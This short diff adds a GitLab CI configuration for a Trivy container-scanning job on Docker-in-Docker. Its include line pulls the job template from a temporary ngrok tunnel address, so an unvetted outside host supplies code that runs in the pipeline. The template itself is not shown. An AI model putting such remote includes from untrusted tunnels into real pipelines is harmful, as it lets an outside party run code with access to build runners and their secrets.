@@ -1,0 +1,18 @@
+image: docker:20.10.16
+
+services:
+    - docker:20.10.16-dind
+
+include:
+    - remote: 'https://271f-176-67-55-113.ngrok-free.app/templates/jobs/container-scanning-dind.gitlab-ci.yml'
+
+stages:
+    - test
+
+variables:
+    DOCKER_TLS_CERTDIR: '/certs'
+
+trivy_container_scanning:
+    stage: test
+    variables:
+        CS_IMAGE: python
